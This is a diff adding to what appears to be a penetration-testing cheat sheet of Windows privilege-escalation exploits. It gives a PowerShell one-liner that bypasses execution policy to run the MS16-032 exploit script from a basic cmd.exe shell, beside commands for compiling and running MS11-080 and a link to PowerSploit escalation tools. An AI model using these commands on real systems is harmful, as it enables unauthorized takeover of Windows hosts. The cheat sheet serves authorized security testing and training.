@@ -1444,6 +1444,14 @@ Handy exploits:
           python pyinstaller.py --onefile ms11-080.py  
           mx11-080.exe -O XP
     
+-   Powershell Exploits - You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt.  Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:
+
+      MS16-032 https://www.exploit-db.com/exploits/39719/
+      
+      `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"`
+      
+    
+    
 -   Powershell Priv Escalation Tools
     https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 
